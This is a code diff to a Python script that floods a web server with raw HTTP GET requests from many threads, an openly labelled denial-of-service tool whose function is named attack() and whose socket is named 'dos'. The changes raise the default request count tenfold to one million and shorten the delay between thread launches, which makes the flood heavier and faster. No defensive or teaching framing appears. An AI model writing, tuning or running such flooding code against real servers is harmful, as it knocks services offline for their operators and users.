@@ -44,15 +44,13 @@ def attack():
     try:
         # Open the connection on that raw socket
         dos.connect((ip, port))
-        # Send the request according to HTTP spec
-        # encoding the attack link to BYTES strings
         attack_link = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
         dos.send(attack_link.encode('utf-8'))
 
     except socket.error as e:
         print("\n [No connection, server may be down]: " + str(e))
     finally:
-        # Close our socket gracefully
+        # Close our socket
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
@@ -68,10 +66,10 @@ if __name__ == "__main__":
 
     if len(sys.argv) == 2:
         port = 80
-        num_requests = 100000
+        num_requests = 1000000
     elif len(sys.argv) == 3:
         port = int(sys.argv[2])
-        num_requests = 100000
+        num_requests = 1000000
     elif len(sys.argv) == 4:
         port = int(sys.argv[2])
         num_requests = int(sys.argv[3])
@@ -105,8 +103,9 @@ if __name__ == "__main__":
         all_threads.append(t1)
 
         # Adjusting this sleep time will affect requests per second
-        request_per_second = 0.15
+        request_per_second = 0.05
         time.sleep(request_per_second)
 
     for current_thread in all_threads:
-        current_thread.join()  # Make the main thread wait for the children threads
+        # Make the main thread wait for the children threads
+        current_thread.join()  
